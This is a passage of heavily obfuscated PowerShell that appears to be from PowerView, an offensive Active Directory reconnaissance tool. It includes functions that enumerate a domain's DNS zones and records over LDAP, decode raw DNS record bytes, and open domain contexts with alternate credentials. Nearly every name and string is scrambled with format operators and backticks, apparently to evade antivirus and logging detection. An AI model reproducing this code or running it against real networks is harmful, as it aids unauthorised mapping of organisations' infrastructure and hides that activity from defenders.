        if (${PsbouN`dP`A`RAMEt`Ers}[("{0}{1}{3}{2}" -f 'Sec','urity','ks','Mas')]) {
            ${seArC`H`eR}."SEcuR`It`ymAsks" = Switch (${secU`Rit`ymAskS}) {
                ("{0}{1}" -f 'D','acl') {   ( &("{2}{1}{0}" -f 'IabLe','AR','V')  ("UW"+"D") )."vaL`UE"::"D`ACl" }
                ("{0}{1}"-f'G','roup') {  (  &("{1}{2}{0}{3}" -f'Bl','GET-','VarIa','e') ("uw"+"d"))."v`ALUE"::"G`ROup" }
                ("{1}{0}"-f 'one','N') {   ( &("{0}{2}{1}"-f 'vArIa','le','b')  ('Uw'+'D'))."VA`luE"::"n`onE" }
                ("{1}{0}" -f 'er','Own') {  ( &('Gi')  ('VAr'+'iAb'+'Le:'+'UWd')  )."Va`LUE"::"o`WNEr" }
                ("{0}{1}"-f'Sa','cl') {  (  &("{1}{0}{2}"-f 'te','cHilDi','m')  ("{0}{2}{1}{3}" -f 'VARI','BLE','a',':uWD') )."VAl`Ue"::"sA`cl" }
            }
        }

        if (${pSbOundp`A`R`A`m`eTeRS}[("{3}{2}{1}{0}" -f 's','ie','ert','Prop')]) {

            ${prOpe`RT`iE`StoLO`AD} = ${P`ROperT`ies}| &("{3}{0}{2}{1}" -f'h-','ject','Ob','ForEac') { ${_}.("{1}{0}" -f 'plit','S').Invoke(',') }
            ${nU`lL} = ${sE`ARCH`Er}."PrOPertIE`s`To`L`Oad".("{2}{0}{1}"-f'ddR','ange','A').Invoke((${pRO`Pe`Rt`iEsTOlo`AD}))
        }

        ${S`EARC`HER}
    }
}

function COnV`e`RT-dnSR`e`coRd {

    [OutputType({"{1}{5}{4}{0}{6}{2}{3}"-f'nag','S','SCustomOb','ject','a','ystem.M','ement.Automation.P'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSITioN = 0, manDAtoRy = ${t`Rue}, VAluEFRompIpeLiNebyPRoPERtyNaMe = ${T`RuE})]
        [Byte[]]
        ${DNs`Re`C`ord}
    )

    BEGIN {
        function gEt-N`A`ME {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{4}{2}"-f'PSUs','eOutputTy','ectly','pe','Corr'}, '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${r`AW}
            )

            [Int]${Leng`TH} = ${r`AW}[0]
            [Int]${S`EGM`En`TS} = ${r`Aw}[1]
            [Int]${i`Nd`ex} =  2
            [String]${Na`ME}  = ''

            while (${sE`Gm`EN`Ts}-- -gt 0)
            {
                [Int]${s`Eg`mentLEn`gTH} = ${r`AW}[${In`d`ex}++]
                while (${sEGME`NtleNG`Th}-- -gt 0) {
                    ${nA`mE} += [Char]${R`AW}[${i`Nd`EX}++]
                }
                ${nA`me} += "."
            }
            ${N`AMe}
        }
    }

    PROCESS {

        ${rd`AT`ATYpE} =  ( &("{2}{0}{1}" -f'IabL','E','VaR')  ("{1}{0}{2}"-f'6r','Q','hSu') -ValUe  )::("{0}{1}" -f 'ToU','Int16').Invoke(${dnsr`e`CoRD}, 2)
        ${u`PDa`TeD`A`Ts`ErIAL} =  (  &("{1}{0}{2}{3}"-f'-VarI','GeT','abL','E') ('Q6r'+'hs'+'U')  )."vAL`UE"::("{1}{0}{2}" -f 'nt','ToUI','32').Invoke(${dNs`R`EcOrd}, 8)

        ${t`TL`RAw} = ${DN`srE`CORD}[12..15]

        ${n`UlL} =   ${Y`kc}::("{0}{1}{2}"-f 'Re','v','erse').Invoke(${T`TL`RAW})
        ${t`TL} =  ( &("{1}{0}"-f 'IR','d') ('v'+'A'+'R'+'iabLE:Q6rH'+'su') )."VAL`UE"::("{1}{0}"-f '32','ToUInt').Invoke(${Tt`lr`Aw}, 0)

        ${a`gE} =  (&("{1}{0}"-f 'E','vArIaBL')  ("Q"+"6rHSu")  )."V`ALUe"::("{2}{1}{0}" -f'32','Int','ToU').Invoke(${d`N`sReCo`Rd}, 20)
        if (${A`Ge} -ne 0) {
            ${TiME`Sta`Mp} = ((&("{0}{1}" -f'G','et-Date') -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).("{2}{1}{0}" -f 's','our','AddH').Invoke(${A`GE})).("{2}{1}{0}"-f'ng','ri','ToSt').Invoke()
        }
        else {
            ${TiME`St`Amp} = ("{0}{2}{1}"-f '[s','tic]','ta')
        }

        ${dnsre`Co`RdOBJ`Ect} = &("{3}{2}{0}{1}" -f 'e','ct','ew-Obj','N') ("{1}{0}"-f'bject','PSO')

        if (${R`dAtAt`yPe} -eq 1) {
            ${Ip} = "{0}.{1}.{2}.{3}" -f ${DN`s`Rec`ORD}[24], ${dN`sREc`OrD}[25], ${D`NSRe`COrd}[26], ${d`NSrEco`Rd}[27]
            ${da`Ta} = ${Ip}
            ${dN`sRe`c`oRDObJeCt} | &("{0}{1}{2}"-f 'Ad','d-Mem','ber') ("{1}{3}{0}{2}" -f'er','N','ty','oteprop') ("{3}{2}{0}{1}" -f 'c','ordType','e','R') 'A'
        }

        elseif (${Rd`ATA`Type} -eq 2) {
            ${nS`N`Ame} = &("{0}{1}"-f 'Get-','Name') ${dns`Re`cOrd}[24..${Dns`Rec`ord}."LE`NGtH"]
            ${dA`Ta} = ${nsNa`mE}
            ${DnS`R`Eco`R`D`OBjEct} | &("{1}{0}{2}"-f'-Mem','Add','ber') ("{2}{1}{0}{3}"-f'propert','e','Not','y') ("{1}{2}{0}"-f 'ype','Reco','rdT') 'NS'
        }

        elseif (${Rda`TA`T`YpE} -eq 5) {
            ${A`Li`AS} = &("{1}{0}{2}"-f't-Na','Ge','me') ${Dn`sR`ECord}[24..${dnSRE`cO`Rd}."LEng`TH"]
            ${Da`Ta} = ${a`liaS}
            ${D`NS`ReCO`RDOBJeCT} | &("{0}{1}{2}" -f'Ad','d-','Member') ("{1}{2}{3}{0}"-f'erty','Not','ep','rop') ("{1}{0}{2}"-f 'rdT','Reco','ype') ("{1}{0}" -f 'NAME','C')
        }

        elseif (${R`D`Atat`yPE} -eq 6) {

            ${D`AtA} = $( (  &('lS') ("{3}{0}{2}{1}"-f 'e','4Fb0E',':','vaRiAbl')  )."v`Alue"::"tO`Base64STR`Ing"(${dnSrec`O`Rd}[24..${DNsRE`c`Ord}."LEn`gTh"]))
            ${DnsRECoR`DoB`JE`cT} | &("{2}{3}{0}{1}" -f '-Memb','er','A','dd') ("{0}{1}{3}{2}" -f'N','otep','y','ropert') ("{3}{2}{0}{1}" -f'cordTyp','e','e','R') 'SOA'
        }

        elseif (${rD`AT`At`yPE} -eq 12) {
            ${p`Tr} = &("{2}{0}{1}"-f't-N','ame','Ge') ${Dn`srec`oRD}[24..${d`Nsr`E`CORD}."lE`Ngth"]
            ${dA`TA} = ${P`TR}
            ${dNs`Rec`ORDo`BJEcT} | &("{0}{2}{1}" -f'Add-Mem','er','b') ("{3}{1}{2}{0}"-f'erty','otepr','op','N') ("{3}{2}{0}{1}" -f 'yp','e','T','Record') 'PTR'
        }

        elseif (${r`DATa`TY`pe} -eq 13) {

            ${d`ATA} = $( (&("{0}{3}{1}{2}" -f 'Ge','-VAri','aBLe','t') ("4Fb0"+"e") )."Va`LUE"::"tObaSE64`sTR`InG"(${DNsR`E`coRD}[24..${dN`srEco`Rd}."LE`NGtH"]))
            ${d`N`SrEco`RDObJECt} | &("{0}{2}{1}" -f 'Ad','-Member','d') ("{3}{1}{2}{0}" -f 'y','oper','t','Notepr') ("{0}{1}{2}" -f'Reco','rdTy','pe') ("{0}{1}" -f'HI','NFO')
        }

        elseif (${RD`ATaT`YpE} -eq 15) {

            ${d`ATA} = $( ${4`FB0E}::"Tob`ASe64`st`RiNG"(${dN`SreC`OrD}[24..${d`NSr`ECoRD}."LEN`gTh"]))
            ${dNSr`ec`O`RDobje`Ct} | &("{1}{0}{2}" -f'-Me','Add','mber') ("{1}{2}{0}{3}"-f 'r','Notepr','ope','ty') ("{1}{2}{0}"-f 'ype','Re','cordT') 'MX'
        }

        elseif (${R`daT`AtyPE} -eq 16) {
            [string]${T`Xt}  = ''
            [int]${S`eG`MeN`T`LengtH} = ${Dn`SreC`ORD}[24]
            ${i`NDEx} = 25

            while (${sE`GmeN`T`L`ENGTh}-- -gt 0) {
                ${T`XT} += [char]${dN`s`REC`oRD}[${IN`D`EX}++]
            }

            ${dA`Ta} = ${t`xT}
            ${dnsRe`C`orD`ObjE`ct} | &("{1}{2}{0}" -f 'r','A','dd-Membe') ("{0}{3}{1}{2}"-f'N','rope','rty','otep') ("{0}{2}{1}"-f 'Rec','dType','or') 'TXT'
        }

        elseif (${RDa`T`At`ypE} -eq 28) {

            ${dA`TA} = $(  (&("{0}{1}"-f 'di','R') ("{1}{0}{2}"-f'IABle:4F','vAR','B0E')  )."vA`LUe"::"TOb`Ase6`4StRinG"(${DN`SRECo`Rd}[24..${dn`Sre`CorD}."LeN`gTh"]))
            ${dnSr`EcoR`D`o`B`jECt} | &("{2}{1}{0}"-f 'r','e','Add-Memb') ("{3}{0}{1}{2}"-f'otepro','pe','rty','N') ("{2}{1}{0}" -f'e','yp','RecordT') ("{1}{0}" -f 'AA','AA')
        }

        elseif (${rd`Ata`TyPe} -eq 33) {

            ${DA`Ta} = $( (  &("{1}{0}" -f 'I','gc') ("{1}{3}{0}{2}" -f '0','VARIAbL','E','E:4fb'))."Val`UE"::"tO`B`Ase6`4StrIng"(${DNSREC`o`RD}[24..${dn`S`ReCorD}."l`ENgth"]))
            ${dNs`RE`CORDO`BjE`cT} | &("{1}{2}{0}"-f 'ber','Add-','Mem') ("{1}{2}{0}" -f 'y','Notepr','opert') ("{0}{1}{2}" -f'Record','T','ype') 'SRV'
        }

        else {
            ${DA`Ta} = $(  ${4f`B0E}::"TObAS`e64`str`ING"(${Dn`sRe`co`Rd}[24..${D`NsreCo`RD}."lEN`gTh"]))
            ${DNSRe`C`ORdobJ`ecT} | &("{3}{0}{2}{1}" -f'd','Member','d-','A') ("{1}{0}{3}{2}"-f 'tep','No','erty','rop') ("{1}{0}{2}{3}" -f 'rdT','Reco','y','pe') ("{1}{2}{0}" -f 'WN','UNK','NO')
        }

        ${DNSr`eCoR`D`Ob`JEct} | &("{1}{0}{2}" -f'd-Membe','Ad','r') ("{0}{2}{1}" -f'Notep','ty','roper') ("{0}{2}{1}"-f'U','erial','pdatedAtS') ${uP`d`At`eDa`TserIAl}
        ${DnS`R`ecoR`d`OBjecT} | &("{2}{1}{0}" -f '-Member','d','Ad') ("{1}{2}{0}" -f'eproperty','No','t') 'TTL' ${t`Tl}
        ${D`N`SREcoRd`ObJ`ect} | &("{2}{0}{3}{1}"-f'M','er','Add-','emb') ("{1}{2}{0}"-f 'operty','Not','epr') 'Age' ${A`ge}
        ${dnsReCOR`DoB`je`CT} | &("{0}{2}{3}{1}"-f 'A','mber','d','d-Me') ("{2}{0}{1}"-f 'r','ty','Noteprope') ("{2}{1}{0}"-f'p','tam','TimeS') ${t`i`mesTamp}
        ${Dn`s`REco`Rdo`BjEcT} | &("{2}{3}{0}{1}" -f 'em','ber','A','dd-M') ("{1}{2}{0}" -f'erty','No','teprop') ("{0}{1}"-f'Da','ta') ${da`TA}
        ${dNsRe`cOr`DOBje`cT}
    }
}

function G`ET-do`Ma`IN`dNsZO`Ne {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}{3}" -f 'uldPr','PSSho','o','cess'}, '')]
    [OutputType({"{4}{0}{2}{1}{3}" -f 'w','.D','erView','NSZone','Po'})]
    [CmdletBinding()]
    Param(
        [Parameter(posiTIon = 0, vALueFrOmpipElinE = ${t`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${d`omA`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{2}{0}"-f'r','omainControl','le','D'})]
        [String]
        ${se`Rv`er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`ROPeRtI`ES},

        [ValidateRange(1, 10000)]
        [Int]
        ${R`eSulTPAG`eSizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRVE`RTI`mE`LIm`It},

        [Alias({"{2}{1}{0}"-f'ne','urnO','Ret'})]
        [Switch]
        ${fi`NdONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cre`de`Nt`IaL} =  (&("{0}{1}"-f'cHIl','diteM')  ("{2}{3}{4}{0}{1}" -f'P','kFezn','VARiAB','l','e:')  )."v`AlUE"::"em`pty"
    )

    PROCESS {
        ${Sear`C`HERArGUmen`Ts} = @{
            ("{2}{0}{1}"-f 'APFil','ter','LD') = ("{0}{1}{2}{3}"-f '(object','Class=dnsZon','e',')')
        }
        if (${pS`BOuN`DpAraMEte`Rs}[("{1}{0}"-f'in','Doma')]) { ${S`EarC`HER`A`RG`UMEnts}[("{2}{0}{1}" -f'ai','n','Dom')] = ${dOMA`iN} }
        if (${p`SbOuN`D`parA`me`Ters}[("{0}{1}" -f'Se','rver')]) { ${sE`ARCHERArgU`mEn`TS}[("{1}{2}{0}" -f'er','Se','rv')] = ${S`ERv`er} }
        if (${p`S`BOU`N`dpAraMEt`ERs}[("{0}{2}{1}" -f 'Pr','rties','ope')]) { ${SEaRc`h`e`RARgUmEnts}[("{2}{3}{0}{1}"-f 'ertie','s','Pr','op')] = ${p`RoPe`RTIEs} }
        if (${PSBOuN`DPA`RA`Met`e`RS}[("{0}{1}{3}{2}"-f 'R','esul','ze','tPageSi')]) { ${s`e`ArcH`ERAR`GUme`NTs}[("{1}{0}{2}" -f'geSi','ResultPa','ze')] = ${ReS`Ultpa`ge`S`Ize} }
        if (${PSbOU`NdpARAm`E`Te`Rs}[("{2}{3}{1}{0}"-f'imit','eL','S','erverTim')]) { ${SEA`R`CH`Era`RGUMe`NTs}[("{3}{2}{1}{0}"-f 'it','erTimeLim','erv','S')] = ${s`ErvE`RtIMELi`m`IT} }
        if (${Ps`BO`UndPaRa`m`etERs}[("{1}{0}{2}{3}"-f 'ede','Cr','nt','ial')]) { ${S`E`A`Rc`HeR`ArgUMenTs}[("{0}{1}{2}" -f'Cr','ede','ntial')] = ${c`RE`dEnt`ial} }
        ${DNsS`e`A`RCheR1} = &("{3}{2}{0}{4}{1}"-f 'om','inSearcher','-D','Get','a') @SearcherArguments

        if (${dnsseA`R`ChE`R1}) {
            if (${PS`B`Ou`ND`PARamETERs}[("{2}{1}{0}"-f'ne','indO','F')]) { ${r`e`sULts} = ${dns`SEAR`c`HER1}.("{0}{1}"-f'Find','One').Invoke()  }
            else { ${R`E`SULtS} = ${dn`ssEaRc`h`Er1}.("{0}{1}" -f 'FindAl','l').Invoke() }
            ${rESu`LtS} | &("{0}{2}{1}{3}" -f'Wher','bj','e-O','ect') {${_}} | &("{1}{0}{2}"-f 'j','ForEach-Ob','ect') {
                ${O`Ut} = &("{3}{4}{0}{1}{2}"-f '-LDA','PPropert','y','Con','vert') -Properties ${_}."prOPe`R`Ties"
                ${O`UT} | &("{2}{1}{0}"-f 'ber','d-Mem','Ad') ("{0}{3}{2}{1}" -f'Note','operty','r','P') ("{0}{1}{2}"-f 'ZoneN','am','e') ${O`UT}."n`AME"
                ${o`UT}."PSOb`J`ECt"."TYpENA`m`ES".("{2}{1}{0}" -f't','er','Ins').Invoke(0, ("{1}{0}{2}{3}" -f 'V','Power','i','ew.DNSZone'))
                ${O`UT}
            }

            if (${Re`SU`lTS}) {
                try { ${rEs`ULTS}.("{0}{1}" -f'dispo','se').Invoke() }
                catch {
                    &("{3}{4}{2}{1}{0}"-f'ose','Verb','e-','Wri','t') ('[Get-'+'Do'+'mai'+'nD'+'FSS'+'ha'+'re] '+'E'+'rror '+'di'+'sposi'+'ng '+'of'+' '+'t'+'he '+'Resul'+'ts'+' '+'ob'+'ject: '+"$_")
                }
            }
            ${d`N`SsEa`RcHer1}.("{2}{1}{0}"-f'ose','sp','di').Invoke()
        }

        ${S`E`A`RC`he`RArGUMeNTS}[("{2}{0}{4}{1}{3}" -f'earc','a','S','sePrefix','hB')] = ("{7}{2}{3}{0}{1}{6}{5}{8}{4}"-f ',','DC','cr','osoftDNS','es','main','=Do','CN=Mi','DnsZon')
        ${dn`Sse`ARC`H`eR2} = &("{3}{0}{1}{4}{2}"-f'ain','Se','cher','Get-Dom','ar') @SearcherArguments

        if (${D`Ns`SEA`RCHE`R2}) {
            try {
                if (${ps`B`o`U`NdparAMETeRS}[("{0}{1}"-f'Fi','ndOne')]) { ${RESuL`TS} = ${D`N`sSeArCher2}.("{0}{1}" -f 'F','indOne').Invoke() }
                else { ${R`E`SuLTS} = ${Dn`SSE`ArCH`Er2}.("{1}{0}"-f 'dAll','Fin').Invoke() }
                ${r`E`sULTS} | &("{0}{2}{1}" -f'Wh','-Object','ere') {${_}} | &("{2}{0}{1}" -f 'ec','t','ForEach-Obj') {
                    ${O`UT} = &("{1}{4}{6}{0}{2}{3}{5}"-f 'P','C','roper','t','onvert-','y','LDAP') -Properties ${_}."p`ROper`Ti`es"
                    ${O`UT} | &("{1}{2}{0}" -f 'r','Add-Me','mbe') ("{0}{1}{2}{3}"-f 'No','te','Pro','perty') ("{2}{1}{0}"-f'e','neNam','Zo') ${o`UT}."n`AmE"
                    ${o`UT}."P`SOBJ`eCT"."Typ`eNA`MES".("{0}{1}" -f'In','sert').Invoke(0, ("{3}{0}{4}{1}{2}"-f 'w','View.DNSZon','e','Po','er'))
                    ${O`Ut}
                }
                if (${re`S`ULTs}) {
                    try { ${rEsuL`TS}.("{2}{0}{1}" -f'sp','ose','di').Invoke() }
                    catch {
                        &("{0}{1}{3}{2}"-f'W','r','bose','ite-Ver') ('['+'Get-'+'DomainDNSZone'+'] '+'E'+'rror '+'d'+'isposi'+'ng '+'of'+' '+'the'+' '+'Resul'+'ts'+' '+'o'+'bj'+'ect: '+"$_")
                    }
                }
            }
            catch {
                &("{1}{0}{3}{2}{4}" -f'-','Write','er','V','bose') ((("{6}{0}{19}{13}{21}{20}{17}{4}{11}{8}{3}{7}{14}{10}{12}{5}{2}{1}{16}{18}{9}{15}"-f 'Get-Dom','omain','S,DC=D','mC','ng','N','[','N=Mi','NG','ZonesNG','sof',' ','tD','inD','cro','m','Dn','or accessi','s','a','one] Err','NSZ')) -cRePlACe  'NGm',[CHar]39)
            }
            ${D`NssEar`ChE`R2}.("{1}{0}" -f 'pose','dis').Invoke()
        }
    }
}

function GEt-d`OMAi`Nd`NsR`e`cORD {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{3}{1}" -f'SShoul','ess','P','dProc'}, '')]
    [OutputType({"{0}{3}{2}{1}{4}{5}"-f'PowerView.','o','ec','DNSR','r','d'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsitiON = 0,  maNdaTOrY = ${tr`UE}, VALuefRompIPelINe = ${TR`UE}, vALuEfROMpIpeLINebYPrOPErTYnaME = ${T`RUe})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${zON`en`Ame},

        [ValidateNotNullOrEmpty()]
        [String]
        ${doMa`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{4}{2}{0}{1}" -f 'ro','ller','ont','Domai','nC'})]
        [String]
        ${Ser`VeR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PRopE`Rt`I`ES} = ("{5}{4}{2}{12}{8}{6}{10}{1}{11}{0}{3}{9}{7}" -f'ord,','r','dis','w','ame,','n','guishedname,d','henchanged','n','hencreated,w','ns','ec','ti'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`ESUL`TPaGE`size} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`eR`VERtImeLI`miT},

        [Alias({"{2}{1}{0}"-f 'nOne','r','Retu'})]
        [Switch]
        ${fI`ND`onE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`Re`de`NtIal} =   (  &("{0}{1}{2}"-f'GE','t-i','TEM') ('vaR'+'I'+'ABLE'+':P'+'kFeZn'))."Va`lUe"::"e`mPtY"
    )

    PROCESS {
        ${S`eArCHE`R`Ar`GUMeNTs} = @{
            ("{2}{1}{0}{3}" -f'lte','i','LDAPF','r') = ("{0}{4}{1}{3}{2}"-f'(o','ectClas',')','s=dnsNode','bj')
            ("{3}{2}{0}{1}{4}"-f 'B','aseP','ch','Sear','refix') = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if (${psboUN`dpa`RaM`ET`ErS}[("{0}{1}" -f'Dom','ain')]) { ${sE`A`RcheR`A`Rg`UmeNtS}[("{1}{0}" -f 'n','Domai')] = ${dO`ma`IN} }
        if (${pSBOUnd`P`ARa`MeteRS}[("{0}{1}"-f 'Serve','r')]) { ${sEaR`chE`RARGum`EN`TS}[("{1}{0}"-f 'ver','Ser')] = ${sE`Rver} }
        if (${p`SbOun`dPA`Ra`MeTE`Rs}[("{2}{0}{1}"-f 'ertie','s','Prop')]) { ${SeArc`he`Ra`RgUm`e`NTs}[("{2}{1}{0}"-f'es','operti','Pr')] = ${PROp`e`RT`Ies} }
        if (${ps`B`ouNDP`AR`AMETERs}[("{2}{0}{3}{1}"-f 't','eSize','Resul','Pag')]) { ${Sea`RCh`E`RARGuMENtS}[("{3}{1}{0}{2}{4}" -f'sultPage','e','Siz','R','e')] = ${R`ESU`LTpagE`sizE} }
        if (${psBO`UN`dpARAME`TE`RS}[("{0}{2}{4}{1}{3}" -f'Serve','m','r','eLimit','Ti')]) { ${se`ArchER`Ar`GU`MENtS}[("{3}{1}{0}{2}"-f 'meL','erverTi','imit','S')] = ${Se`R`VEr`TIME`liMit} }
        if (${Psbou`N`Dp`A`Rame`TERS}[("{1}{2}{0}"-f'ial','C','redent')]) { ${sEa`R`chE`RAr`GuMe`NTS}[("{1}{2}{0}" -f 'al','Creden','ti')] = ${CRedeN`T`i`Al} }
        ${D`NssE`ARc`hEr} = &("{3}{1}{2}{4}{0}"-f'rcher','-','D','Get','omainSea') @SearcherArguments

        if (${DnSS`e`Ar`cheR}) {
            if (${P`SbO`U`NDparameTErs}[("{0}{1}" -f'FindO','ne')]) { ${r`E`sULts} = ${DNs`s`earCHeR}.("{1}{0}{2}" -f'dOn','Fin','e').Invoke() }
            else { ${r`EsuLTs} = ${dN`ss`E`ArChER}.("{0}{1}"-f'Fi','ndAll').Invoke() }
            ${REsU`L`Ts} | &("{0}{2}{3}{1}" -f'Wher','ct','e-Obj','e') {${_}} | &("{2}{3}{0}{1}" -f'je','ct','For','Each-Ob') {
                try {
                    ${o`Ut} = &("{0}{1}{2}{4}{3}"-f 'Co','n','vert','Property','-LDAP') -Properties ${_}."PRoper`TI`eS" | &("{1}{0}{2}" -f'lect-','Se','Object') ("{1}{0}" -f 'e','nam'),("{0}{2}{4}{3}{5}{1}"-f'd','me','isti','guished','n','na'),("{0}{1}{2}"-f'dns','r','ecord'),("{0}{1}{3}{2}" -f'whencr','ea','d','te'),("{2}{0}{1}"-f 'enchang','ed','wh')
                    ${O`UT} | &("{2}{3}{1}{0}" -f'er','emb','Add-','M') ("{0}{2}{1}"-f'N','roperty','oteP') ("{2}{0}{1}"-f'a','me','ZoneN') ${Z`ONENa`ME}

                    if (${O`UT}."dNs`Re`cOrD" -is [System.DirectoryServices.ResultPropertyValueCollection]) {

                        ${ReC`O`RD} = &("{3}{2}{4}{1}{0}{5}"-f'NSReco','D','o','C','nvert-','rd') -DNSRecord ${O`Ut}."D`Ns`RECord"[0]
                    }
                    else {
                        ${re`c`ORd} = &("{0}{1}{3}{2}" -f 'Convert-DN','SRe','rd','co') -DNSRecord ${o`Ut}."dN`sR`ECoRD"
                    }

                    if (${RECO`RD}) {
                        ${r`E`cORd}."pSOB`j`EcT"."P`ROPeR`TIEs" | &("{0}{1}{2}"-f 'ForE','ach-Obj','ect') {
                            ${O`UT} | &("{1}{2}{0}" -f 'er','Add-','Memb') ("{2}{1}{0}" -f 'rty','ope','NotePr') ${_}."NA`ME" ${_}."Va`luE"
                        }
                    }

                    ${o`UT}."pSObJE`Ct"."type`Na`Mes".("{1}{0}"-f 'rt','Inse').Invoke(0, ("{4}{3}{2}{1}{0}"-f 'Record','S','N','erView.D','Pow'))
                    ${o`Ut}
                }
                catch {
                    &("{1}{2}{0}" -f 'g','Write-Wa','rnin') ('['+'Get-Domai'+'nDNSRec'+'ord]'+' '+'E'+'rror: '+"$_")
                    ${O`Ut}
                }
            }

            if (${re`S`ULTs}) {
                try { ${rE`s`ULTs}.("{0}{2}{1}"-f'di','e','spos').Invoke() }
                catch {
                    &("{3}{2}{1}{0}"-f'erbose','e-V','t','Wri') ('[Get'+'-D'+'om'+'ain'+'DNSRecor'+'d] '+'E'+'rror '+'dis'+'posing'+' '+'of'+' '+'th'+'e '+'Re'+'sul'+'ts '+'ob'+'ject'+': '+"$_")
                }
            }
            ${DNs`s`EA`RcHer}.("{1}{0}{2}" -f 'i','d','spose').Invoke()
        }
    }
}

function gEt`-Do`mAIN {

    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(posITION = 0, vAluEfRoMPIpeLine = ${T`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${DomA`in},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crEd`ENTI`Al} =  (&("{3}{0}{2}{1}" -f'ET-VaR','ABlE','I','g')  ("{0}{1}"-f 'P','KfezN') )."V`AlUE"::"Em`pty"
    )

    PROCESS {
        if (${Ps`B`ouNd`PAR`AmeTERS}[("{1}{0}{2}" -f'nt','Crede','ial')]) {

            &("{2}{1}{0}"-f'bose','e-Ver','Writ') ("{11}{13}{16}{4}{10}{7}{15}{9}{5}{2}{14}{1}{0}{12}{8}{6}{3}" -f'fo','tials ','d','in','mai',' cre','-Doma','Using ','Get','ternate','n] ','[','r ','G','en','al','et-Do')

            if (${PsBOUndP`A`RaMet`Ers}[("{1}{0}" -f'in','Doma')]) {
                ${ta`RgEtDo`Main} = ${do`MaiN}
            }
            else {

                ${tA`RgeT`DO`MaIn} = ${cr`e`DENt`iAL}.("{1}{3}{2}{0}"-f 'Credential','GetNetw','rk','o').Invoke()."Do`MAIN"
                &("{1}{2}{0}" -f 'se','Write-V','erbo') ('[Get-D'+'om'+'ain]'+' '+'Extract'+'ed'+' '+'domai'+'n'+' '+"'$TargetDomain' "+'f'+'rom '+'-Crede'+'ntia'+'l')
            }

            ${domA`i`Nc`OnTExt} = &("{1}{0}{2}"-f'Obj','New-','ect') ("{6}{10}{5}{0}{7}{1}{8}{9}{3}{4}{2}" -f'D','toryServices.','t','ir','ectoryContex','stem.','S','irec','ActiveDirec','tory.D','y')(("{2}{1}{0}"-f 'ain','m','Do'), ${tA`RGETdOMA`in}, ${CRE`dE`NTIAl}."Use`RN`AME", ${CR`eDe`Nt`ial}.("{0}{1}{3}{2}{6}{4}{5}"-f 'GetNet','wor','Cr','k','de','ntial','e').Invoke()."PAS`S`WoRD")

            try {
                  (&("{0}{1}"-f'di','r') ("{1}{3}{0}{2}" -f'RIABle:','V','cKZO','A') )."vaL`Ue"::("{0}{1}{2}" -f'GetDoma','i','n').Invoke(${doMA`IN`cON`TE`Xt})
            }
            catch {
                &("{1}{2}{0}{3}"-f'o','Write','-Verb','se') ('['+'Ge'+'t-Domai'+'n] '+'The'+' '+'sp'+'ecifi'+'ed '+'do'+'main '+"'$TargetDomain' "+'d'+'oes '+'n'+'ot '+'exist,'+' '+'c'+'ou'+'ld '+'n'+'ot '+'b'+'e '+'c'+'ontac'+'t'+'ed, '+'ther'+'e '+(('isn'+'56'+'bt ')  -REplAcE'56b',[chaR]39)+'an'+' '+'exi'+'sting '+'tru'+'st, '+'o'+'r '+'the'+' '+'s'+'p'+'ecified '+'c'+'r'+'ed'+'entials '+'ar'+'e '+'i'+'n'+'valid: '+"$_")
            }
        }
        elseif (${p`SBoUnD`parAM`E`TE`RS}[("{1}{2}{0}" -f'in','Do','ma')]) {
            ${D`OM`AiNcONTEXt} = &("{1}{2}{0}"-f 'ect','New','-Obj') ("{3}{14}{6}{4}{10}{0}{13}{2}{1}{9}{5}{8}{11}{7}{12}" -f 'ces','eDirec','v','System.Di','toryS','re','ec','ex','ctoryC','tory.Di','ervi','ont','t','.Acti','r')(("{0}{1}"-f'D','omain'), ${D`OMAiN})
            try {
                  ${Ck`ZO}::("{1}{2}{0}" -f 'omain','G','etD').Invoke(${d`oM`A`Incont`exT})
            }
            catch {
                &("{0}{3}{1}{2}" -f 'Writ','Ver','bose','e-') ('[Get-D'+'o'+'m'+'ain]'+' '+'T'+'he '+'sp'+'e'+'cifie'+'d '+'do'+'main '+"'$Domain' "+'do'+'es '+'not'+' '+'e'+'xist, '+'cou'+'l'+'d '+'n'+'ot '+'be'+' '+'contact'+'ed,'+' '+'or'+' '+'there'+' '+('i'+'sn{0}t ') -F[chAr]39+'a'+'n '+'exist'+'i'+'ng '+'tru'+'st '+': '+"$_")
            }
        }
        else {
            try {
                 ${ck`zo}::("{3}{0}{1}{2}"-f'urrentD','o','main','GetC').Invoke()
            }
            catch {
                &("{0}{1}{2}"-f 'Write','-V','erbose') ('[Get-Dom'+'ain'+'] '+'Err'+'o'+'r '+'retrievin'+'g'+' '+'t'+'he '+'curren'+'t'+' '+'dom'+'ai'+'n: '+"$_")
            }
        }
    }
}

function G`et`-doM`Ai`NCOntro`ll`Er {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{1}{2}"-f 'Sh','ouldProce','ss','PS'}, '')]
    [OutputType({"{2}{1}{0}{3}"-f'omp','rView.C','Powe','uter'})]
